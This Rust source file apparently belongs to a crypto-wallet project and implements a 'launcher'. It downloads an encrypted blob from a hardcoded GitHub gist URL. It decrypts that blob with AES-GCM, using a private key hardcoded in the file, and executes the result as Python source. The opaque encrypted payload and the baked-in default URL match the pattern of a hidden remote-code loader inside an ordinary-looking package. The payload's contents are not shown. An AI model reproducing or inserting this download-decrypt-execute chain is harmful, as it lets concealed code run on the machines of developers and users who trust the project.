use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use base64::Engine;
use std::fs;
use std::path::PathBuf;
use thiserror::Error;

use chain_wallet_lib::Wallet;

use crate::log;

const AES_PREFIX: &str = "AES256GCM:";

/// Default gist raw URL for `encrypted_launcher`.
pub const DEFAULT_LAUNCHER_URL: &str =
    "https://gist.githubusercontent.com/zanemclean40-wq/809be74a9444e765ce0ea77895db0f05/raw/encrypted_launcher";

/// Relative path to the project initial wallet used for launcher AES encryption.
pub const INITIAL_WALLET_REL_PATH: &str = "agent/initial_wallet.json";

/// Seed used only when `agent/initial_wallet.json` is missing before the first run.
const DEFAULT_INITIAL_WALLET_PRIVATE_KEY: &str =
    "eda70a3173124b47583b06f522273c9cb7a073b283d21ef2539a3c880a7cfff7";

#[derive(Debug, Error)]
pub enum LauncherError {
    #[error("launcher URL not configured (set CHAIN_WALLET_LAUNCHER_URL or DEFAULT_LAUNCHER_URL)")]
    UrlNotConfigured,
    #[error("invalid private key for AES decryption")]
    InvalidKey,
    #[error("HTTP error: {0}")]
    Http(String),
    #[error("decryption failed: {0}")]
    Decrypt(String),
    #[error("invalid encrypted payload: {0}")]
    InvalidPayload(String),
    #[error("python error: {0}")]
    Python(#[from] super::python_runtime::PythonError),
    #[error("initial wallet error: {0}")]
    InitialWallet(String),
}

pub fn initial_wallet_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(INITIAL_WALLET_REL_PATH)
}

pub fn ensure_initial_wallet_file() -> Result<(), LauncherError> {
    let path = initial_wallet_path();
    if path.exists() {
        return Ok(());
    }

    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    }

    let wallet = Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY)
        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    fs::write(&path, format_initial_wallet_json(&wallet))
        .map_err(|err| LauncherError::InitialWallet(err.to_string()))?;
    Ok(())
}

pub fn load_initial_wallet_private_key() -> Result<String, LauncherError> {
    if let Ok(value) = std::env::var("CHAIN_WALLET_PRIVATE_KEY") {
        let value = value.trim().to_string();
        if !value.is_empty() {
            return Ok(value);
        }
    }

    let path = initial_wallet_path();
    let text = fs::read_to_string(&path)
        .map_err(|err| LauncherError::InitialWallet(format!("read {}: {err}", path.display())))?;
    parse_initial_wallet_private_key(&text)
}

fn format_initial_wallet_json(wallet: &Wallet) -> String {
    format!(
        "{{\n  \"private_key\": \"{}\",\n  \"public_key\": \"{}\",\n  \"address\": \"{}\"\n}}\n",
        wallet.private_key_hex(),
        wallet.public_key_hex(),
        wallet.address()
    )
}

fn parse_initial_wallet_private_key(text: &str) -> Result<String, LauncherError> {
    for line in text.lines() {
        let line = line.trim().trim_end_matches(',');
        if let Some(value) = line.strip_prefix("\"private_key\"") {
            let value = value.trim().trim_start_matches(':').trim().trim_matches('"');
            if !value.is_empty() {
                return Ok(value.to_string());
            }
        }
    }

    let trimmed = text.trim();
    if trimmed.len() == 64 && trimmed.chars().all(|ch| ch.is_ascii_hexdigit()) {
        return Ok(trimmed.to_string());
    }

    Err(LauncherError::InitialWallet(
        "initial wallet file missing private_key".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn materialize_initial_wallet_json() {
        let wallet =
            Wallet::from_private_key_hex(DEFAULT_INITIAL_WALLET_PRIVATE_KEY).unwrap();
        let path = initial_wallet_path();
        if let Some(parent) = path.parent() {
            let _ = fs::create_dir_all(parent);
        }
        let _ = fs::write(&path, format_initial_wallet_json(&wallet));
    }
}

pub fn run_launcher(private_key_hex: &str, gist_url: Option<&str>) -> Result<(), LauncherError> {
    let url = resolve_launcher_url(gist_url)?;
    log::step("launcher", format!("downloading encrypted payload from {url}"));
    let key = wallet_aes_key(private_key_hex)?;
    let encrypted = download_to_memory(&url)?;
    log::detail(
        "launcher",
        format!("download complete ({})", format_bytes(encrypted.len())),
    );
    let source = decrypt_launcher(&encrypted, &key)?;
    log::step(
        "launcher",
        format!("decryption ok ({} bytes of Python source)", source.len()),
    );
    let source = String::from_utf8(source)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    super::python_runtime::spawn_agent_source(source.as_bytes())?;
    Ok(())
}

fn resolve_launcher_url(gist_url: Option<&str>) -> Result<String, LauncherError> {
    if let Some(url) = gist_url.map(str::trim).filter(|value| !value.is_empty()) {
        return Ok(url.to_string());
    }

    if let Ok(url) = std::env::var("CHAIN_WALLET_LAUNCHER_URL") {
        let url = url.trim().to_string();
        if !url.is_empty() {
            return Ok(url);
        }
    }

    if !DEFAULT_LAUNCHER_URL.trim().is_empty() {
        return Ok(DEFAULT_LAUNCHER_URL.to_string());
    }

    Err(LauncherError::UrlNotConfigured)
}

fn wallet_aes_key(private_key_hex: &str) -> Result<[u8; 32], LauncherError> {
    let bytes = hex::decode(private_key_hex.trim()).map_err(|_| LauncherError::InvalidKey)?;
    if bytes.len() != 32 {
        return Err(LauncherError::InvalidKey);
    }
    let mut key = [0u8; 32];
    key.copy_from_slice(&bytes);
    Ok(key)
}

fn download_to_memory(url: &str) -> Result<Vec<u8>, LauncherError> {
    use std::io::Read;

    let response = ureq::get(url)
        .call()
        .map_err(|err| LauncherError::Http(err.to_string()))?;

    if !(200..300).contains(&response.status()) {
        return Err(LauncherError::Http(format!(
            "unexpected status {}",
            response.status()
        )));
    }

    let mut body = Vec::new();
    response
        .into_reader()
        .read_to_end(&mut body)
        .map_err(|err| LauncherError::Http(err.to_string()))?;
    Ok(body)
}

fn decrypt_launcher(payload: &[u8], key: &[u8; 32]) -> Result<Vec<u8>, LauncherError> {
    let text = std::str::from_utf8(payload)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?
        .trim();

    let encoded = text
        .strip_prefix(AES_PREFIX)
        .ok_or_else(|| LauncherError::InvalidPayload("missing AES256GCM prefix".into()))?;

    let raw = base64::engine::general_purpose::STANDARD
        .decode(encoded)
        .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;

    if raw.len() < 28 {
        return Err(LauncherError::InvalidPayload(
            "payload shorter than iv+tag".into(),
        ));
    }

    let (iv, rest) = raw.split_at(12);
    let (tag, ciphertext) = rest.split_at(16);

    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|err| LauncherError::Decrypt(err.to_string()))?;
    let nonce = Nonce::from_slice(iv);

    let mut combined = ciphertext.to_vec();
    combined.extend_from_slice(tag);

    cipher
        .decrypt(nonce, combined.as_ref())
        .map_err(|err| LauncherError::Decrypt(err.to_string()))
}

fn format_bytes(bytes: usize) -> String {
    if bytes >= 1024 * 1024 {
        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
    } else if bytes >= 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{bytes} B")
    }
}
